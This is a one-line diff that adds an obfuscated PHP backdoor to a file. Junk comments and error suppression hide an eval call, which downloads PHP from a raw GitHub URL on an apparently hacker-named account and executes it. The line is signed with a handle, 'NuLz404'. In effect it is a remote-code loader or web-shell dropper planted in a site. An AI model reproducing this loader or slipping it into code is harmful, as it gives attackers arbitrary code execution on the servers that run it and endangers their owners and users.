@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/JawaTengahXploit1337/JawaTengahXploit1337.github.io/main/nulz-pler.php"))/******/ /*By NuLz404*/?>
